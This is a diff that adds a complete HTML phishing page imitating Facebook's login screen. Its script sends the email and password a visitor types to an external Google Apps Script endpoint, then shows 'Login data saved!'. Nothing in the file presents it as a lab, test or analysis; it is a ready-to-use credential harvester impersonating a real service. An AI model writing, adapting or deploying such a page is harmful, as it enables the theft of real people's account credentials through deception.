@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Facebook – log in or sign up</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      background: white;
+      padding: 40px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+      border-radius: 8px;
+      width: 300px;
+    }
+    .login-box h2 {
+      color: #1877f2;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+    .login-box input {
+      width: 100%;
+      margin: 10px 0;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    .login-box button {
+      width: 100%;
+      padding: 12px;
+      background: #1877f2;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .login-box button:hover {
+      background: #145dbf;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <h2>facebook</h2>
+    <input type="text" id="email" placeholder="Email or phone number" />
+    <input type="password" id="password" placeholder="Password" />
+    <button onclick="submitData()">Log In</button>
+  </div>
+
+  <script>
+    function submitData() {
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      fetch("https://script.google.com/macros/s/AKfycbwk4szjpaX1iBHdC4DA6JLSpL-a6JlTBuIhCmvJaiPBDFbLH-0YICDXsqMuQzGuD2kRLQ/exec", {
+        method: "POST",
+        body: JSON.stringify({ email, password }),
+        headers: {
+          "Content-Type": "application/json"
+        }
+      })
+      .then(res => res.text())
+      .then(msg => {
+        alert("Login data saved!");
+        document.getElementById("email").value = "";
+        document.getElementById("password").value = "";
+      })
+      .catch(err => alert("Error: " + err));
+    }
+  </script>
+</body>
+</html>
